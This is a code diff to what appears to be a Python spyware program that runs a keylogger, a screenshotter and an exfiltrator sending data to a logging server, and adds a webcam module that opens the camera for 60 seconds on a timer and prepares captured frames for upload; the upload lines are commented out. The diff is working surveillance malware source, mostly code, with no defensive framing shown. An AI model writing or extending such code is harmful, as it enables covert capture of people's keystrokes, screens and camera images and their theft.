@@ -7,6 +7,9 @@ from threading import Thread
 import os
 import random
 
+import cv2, time
+
+
 SERVER_IP = "127.0.0.1"
 SERVER_URL = 'https://'+SERVER_IP+'/api/logger'
     
@@ -117,8 +120,10 @@ class Exfiltrator:
 
     def generate_random_file(self, filename, size_in_mb):
         size_in_bytes = size_in_mb * 1024 * 1024
-
-        with open(filename, "wb") as f:
+        directory = os.path.dirname(filename)
+        if not os.path.exists(directory):
+            os.makedirs(directory)
+        with open(filename, 'wb') as f:
             f.write(os.urandom(size_in_bytes))
 
     def delete_random_file(self, filename):
@@ -140,26 +145,67 @@ class Exfiltrator:
         self.exfiltrate()
         # self.delete()
 
+
+class Webcam:
+    def __init__(self, interval):
+        self.interval = interval
+
+    def start(self):
+        print("Webcam started...")
+        self.capture()
+
+    def capture(self):
+        print("Opening camera during 60 seconds...")
+        cap = cv2.VideoCapture(0)
+        start_time = time.time()
+        while( int(time.time() - start_time) < 60 ):
+            ret, frame = cap.read()
+            if not ret:
+                break
+            time.sleep(0.1)
+
+        cap.release()
+        print("Camera closed...")
+        self.send_frame_to_server(frame)
+        timer = Timer(interval=self.interval, function=self.capture)
+        timer.daemon = True
+        timer.start()
+
+    def send_frame_to_server(self, frame):
+        print("Sending frame to server...")
+        # file = {'file': frame}
+        # try:
+        #     response = requests.post("http:localhost:8081/upload", files=file)
+        #     print(response.text)
+        # except Exception as e:
+        #     print(f"Error sending frame: {e}")
+
+
 if __name__ == "__main__":
     keylogger = Keylogger(interval=15)
-    screenshotter = Screenshotter(interval=30)
-    exfiltrator = Exfiltrator(interval=10)
+    #screenshotter = Screenshotter(interval=30)
+    exfiltrator = Exfiltrator(interval=30)
+    webcam = Webcam(interval=30)
 
     # Create threads for keylogger and screenshotter
     keylogger_thread = Thread(target=keylogger.start)
     print("Keylogger thread created...")
-    screenshotter_thread = Thread(target=screenshotter.start)
-    print("Screenshotter thread created...")
+    # screenshotter_thread = Thread(target=screenshotter.start)
+    # print("Screenshotter thread created...")
     exfiltrator_thread = Thread(target=exfiltrator.start)
     print("Exfiltrator thread created...")
+    webcam_thread = Thread(target=webcam.start)
+    print("Webcam thread created...")
 
     # Start threads
     keylogger_thread.start()
-    screenshotter_thread.start()
+    # screenshotter_thread.start()
     exfiltrator_thread.start()
+    webcam_thread.start()
 
     keylogger_thread.join()
-    screenshotter_thread.join()
+    # screenshotter_thread.join()
     exfiltrator_thread.join()
+    webcam_thread.join()
 
     print("Program started...")
